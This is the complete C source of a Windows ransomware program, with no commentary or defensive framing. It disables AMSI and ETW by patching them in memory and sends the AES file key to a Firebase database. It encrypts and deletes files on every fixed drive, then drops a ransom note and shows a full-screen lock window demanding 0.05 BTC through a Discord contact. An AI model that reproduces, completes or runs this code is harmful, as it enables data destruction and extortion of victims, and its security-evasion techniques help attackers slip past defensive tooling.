#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wininet.lib")

#define EXT     L".himself"
#define CHUNK   (1024*1024*5)
#define DB_URL  "https://PROYECTO-default-rtdb.europe-west1.firebasedatabase.app"
#define DISCORD "himself#1337"

typedef struct { BYTE aes[32]; BYTE iv[16]; } KEYSET;

char DEVICE_ID[32];

void GenDeviceID(void) {
    DWORD ser;
    GetVolumeInformationW(L"C:\\", NULL, 0, &ser, NULL, NULL, NULL, 0);
    sprintf(DEVICE_ID, "%.16lX", (unsigned long)ser);
}

void HttpPut(const char* end, const char* json) {
    HINTERNET h = InternetOpenA("h", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET c = InternetConnectA(h, "PROYECTO-default-rtdb.europe-west1.firebasedatabase.app",
                                    443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    char req[256];
    snprintf(req, sizeof(req), "/%s.json", end);
    HINTERNET r = HttpOpenRequestA(c, "PUT", req, NULL, NULL, NULL,
                                    INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    HttpSendRequestA(r, "Content-Type: application/json\r\n", 34,
                      (LPVOID)json, (DWORD)strlen(json));
    InternetCloseHandle(r);
    InternetCloseHandle(c);
    InternetCloseHandle(h);
}

void DisableAMSI(void) {
    DWORD old;
    HMODULE h = LoadLibraryA("amsi.dll");
    if (h) {
        LPVOID p = GetProcAddress(h, "AmsiScanBuffer");
        VirtualProtect(p, 6, PAGE_EXECUTE_READWRITE, &old);
        memcpy(p, "\xB8\x57\x00\x07\x80\xC3", 6);
        VirtualProtect(p, 6, old, &old);
    }
}

void DisableETW(void) {
    DWORD old;
    HMODULE n = GetModuleHandleA("ntdll.dll");
    LPVOID e = GetProcAddress(n, "EtwEventWrite");
    VirtualProtect(e, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)e = 0xC3;
    VirtualProtect(e, 1, old, &old);
}

void GenerateKey(KEYSET* ks) {
    HCRYPTPROV p;
    CryptAcquireContextW(&p, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptGenRandom(p, 32, ks->aes);
    CryptGenRandom(p, 16, ks->iv);
    CryptReleaseContext(p, 0);
}

void CryptFile(const WCHAR* path, KEYSET* ks) {
    WCHAR out[MAX_PATH];
    swprintf(out, MAX_PATH, L"%s%s", path, EXT);
    HANDLE hin = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, 0, NULL);
    if (hin == INVALID_HANDLE_VALUE) return;
    HANDLE hout = CreateFileW(out, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
    if (hout == INVALID_HANDLE_VALUE) { CloseHandle(hin); return; }

    HCRYPTPROV prov;
    CryptAcquireContextW(&prov, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    HCRYPTHASH hash;
    CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hash);
    CryptHashData(hash, ks->aes, 32, 0);
    HCRYPTKEY key;
    CryptDeriveKey(prov, CALG_AES_256, hash, 0, &key);
    CryptSetKeyParam(key, KP_IV, ks->iv, 0);

    BYTE* buf = (BYTE*)VirtualAlloc(NULL, CHUNK, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD rd, wr;
    while (ReadFile(hin, buf, CHUNK, &rd, NULL) && rd) {
        CryptEncrypt(key, 0, rd < CHUNK, 0, buf, &rd, rd);
        WriteFile(hout, buf, rd, &wr, NULL);
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    CryptDestroyKey(key);
    CryptDestroyHash(hash);
    CryptReleaseContext(prov, 0);
    CloseHandle(hin);
    CloseHandle(hout);
    DeleteFileW(path);
}

void Enumerate(WCHAR* root, KEYSET* ks) {
    WCHAR search[MAX_PATH];
    WIN32_FIND_DATAW fd;
    swprintf(search, MAX_PATH, L"%s\\*", root);
    HANDLE h = FindFirstFileW(search, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        WCHAR full[MAX_PATH];
        swprintf(full, MAX_PATH, L"%s\\%s", root, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L".."))
                Enumerate(full, ks);
        } else {
            WCHAR* ext = wcsrchr(fd.cFileName, L'.');
            if (ext && _wcsicmp(ext, EXT) != 0)
                CryptFile(full, ks);
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

DWORD WINAPI LockScreen(LPVOID) {
    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
                                  L"STATIC", L"YOUR FILES ARE ENCRYPTED",
                                  WS_POPUP | WS_VISIBLE,
                                  0, 0,
                                  GetSystemMetrics(SM_CXSCREEN),
                                  GetSystemMetrics(SM_CYSCREEN),
                                  NULL, NULL, NULL, NULL);
    SetWindowLongW(hwnd, GWL_STYLE, 0);
    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    UpdateWindow(hwnd);
    HDC dc = GetDC(hwnd);
    RECT rc;
    GetClientRect(hwnd, &rc);
    for (;;) {
        HBRUSH b = CreateSolidBrush(RGB(200, 0, 0));
        FillRect(dc, &rc, b);
        DeleteObject(b);
        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(255, 255, 255));
        HFONT f = CreateFontW(60, 0, 0, 0, FW_BOLD, 0, 0, 0, 0, 0, 0, 0, 0, L"Consolas");
        SelectObject(dc, f);
        WCHAR msg[512];
        swprintf(msg, sizeof(msg) / sizeof(WCHAR),
                  L"ALL FILES ENCRYPTED\nDevice ID: %S\nContact Discord: %S\nSend 0.05 BTC then DM for key.",
                  DEVICE_ID, DISCORD);
        DrawTextW(dc, msg, -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        Sleep(100);
    }
    return 0;
}

void WriteNote(WCHAR* desktop) {
    WCHAR note[MAX_PATH];
    swprintf(note, MAX_PATH, L"%s\\README_RESTORE_FILES.txt", desktop);
    HANDLE h = CreateFileW(note, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                          FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    char txt[512];
    snprintf(txt, sizeof(txt),
              "ALL FILES ENCRYPTED.\nDevice ID: %s\nContact Discord: %s\nSend 0.05 BTC then DM for key.",
              DEVICE_ID, DISCORD);
    DWORD bw;
    WriteFile(h, txt, (DWORD)strlen(txt), &bw, NULL);
    CloseHandle(h);
}

void main(void) {
    DisableAMSI();
    DisableETW();
    KEYSET ks;
    GenerateKey(&ks);
    GenDeviceID();
    char keyHex[65];
    for (int i = 0; i < 32; i++) sprintf(keyHex + i * 2, "%02X", ks.aes[i]);
    char json[256];
    snprintf(json, sizeof(json), "{\"key\":\"%s\",\"paid\":0}", keyHex);
    HttpPut(DEVICE_ID, json);
    WCHAR desktop[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktop);
    WriteNote(desktop);
    WCHAR drives[256];
    DWORD sz = GetLogicalDriveStringsW(255, drives);
    for (WCHAR* d = drives; *d; d += wcslen(d) + 1) {
        if (GetDriveTypeW(d) == DRIVE_FIXED)
            Enumerate(d, &ks);
    }
    CreateThread(NULL, 0, LockScreen, NULL, 0, NULL);
    for (;;) Sleep(INFINITE);
}